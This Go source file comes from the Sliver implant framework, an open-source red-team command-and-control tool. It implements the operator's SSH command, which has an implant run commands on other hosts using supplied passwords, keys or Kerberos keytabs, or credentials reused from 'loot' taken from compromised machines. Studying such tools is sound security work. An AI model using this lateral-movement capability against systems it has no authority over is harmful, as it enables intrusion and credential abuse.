package exec

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"os"
	"strings"

	"github.com/AlecAivazis/survey/v2"
	"github.com/bishopfox/sliver/client/command/loot"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/desertbit/grumble"
	"google.golang.org/protobuf/proto"
)

// SSHCmd - A built-in SSH client command for the remote system (doesn't shell out)
func SSHCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
	var (
		privKey []byte
		err     error
	)
	session := con.ActiveTarget.GetSessionInteractive()
	if session == nil {
		return
	}

	username := ctx.Flags.String("login")
	if username == "" {
		username = session.GetUsername()
	}

	port := ctx.Flags.Uint("port")
	privateKeyPath := ctx.Flags.String("private-key")
	if privateKeyPath != "" {
		privKey, err = os.ReadFile(privateKeyPath)
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}
	}
	password := ctx.Flags.String("password")

	hostname := ctx.Args.String("hostname")
	command := ctx.Args.StringList("command")
	kerberosRealm := ctx.Flags.String("kerberos-realm")
	kerberosConfig := ctx.Flags.String("kerberos-config")
	kerberosKeytabFile := ctx.Flags.String("kerberos-keytab")

	if kerberosRealm != "" && kerberosKeytabFile == "" {
		con.PrintErrorf("You must specify a keytab file with the --kerberos-keytab flag\n")
		return
	}
	kerberosKeytab := []byte{}
	if kerberosKeytabFile != "" {
		kerberosKeytab, err = os.ReadFile(kerberosKeytabFile)
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}
	}

	if password == "" && len(privKey) == 0 && !ctx.Flags.Bool("skip-loot") {
		oldUsername := username
		username, password, privKey = tryCredsFromLoot(con)
		if username == "" {
			username = oldUsername
		}
	}

	sshCmd, err := con.Rpc.RunSSHCommand(context.Background(), &sliverpb.SSHCommandReq{
		Username: username,
		Hostname: hostname,
		Port:     uint32(port),
		PrivKey:  privKey,
		Password: password,
		Command:  strings.Join(command, " "),
		Realm:    kerberosRealm,
		Krb5Conf: kerberosConfig,
		Keytab:   kerberosKeytab,
		Request:  con.ActiveTarget.Request(ctx),
	})
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	if sshCmd.Response != nil && sshCmd.Response.Async {
		con.AddBeaconCallback(sshCmd.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, sshCmd)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}
			PrintSSHCmd(sshCmd, con)
		})
		con.PrintAsyncResponse(sshCmd.Response)
	} else {
		PrintSSHCmd(sshCmd, con)
	}
}

// PrintSSHCmd - Print the ssh command response
func PrintSSHCmd(sshCmd *sliverpb.SSHCommand, con *console.SliverConsoleClient) {
	if sshCmd.Response != nil && sshCmd.Response.Err != "" {
		con.PrintErrorf("Error: %s\n", sshCmd.Response.Err)
		if sshCmd.StdErr != "" {
			con.PrintErrorf("StdErr: %s\n", sshCmd.StdErr)
		}
		return
	}
	if sshCmd.StdOut != "" {
		con.PrintInfof("Output:\n")
		con.Println(sshCmd.StdOut)
		if sshCmd.StdErr != "" {
			con.PrintInfof("StdErr:\n")
			con.Println(sshCmd.StdErr)
		}
	}
}

func tryCredsFromLoot(con *console.SliverConsoleClient) (string, string, []byte) {
	var (
		username string
		password string
		privKey  []byte
	)
	confirm := false
	prompt := &survey.Confirm{Message: "No credentials provided, use from loot?"}
	survey.AskOne(prompt, &confirm, nil)
	if confirm {
		cred, err := loot.SelectCredentials(con)
		if err != nil {
			con.PrintErrorf("Invalid loot data, will try to use the SSH agent")
		} else {
			switch cred.CredentialType {
			case clientpb.CredentialType_API_KEY:
				privKey = []byte(cred.Credential.APIKey)
			case clientpb.CredentialType_USER_PASSWORD:
				username = cred.Credential.User
				password = cred.Credential.Password
			}
		}
	}
	return username, password, privKey
}
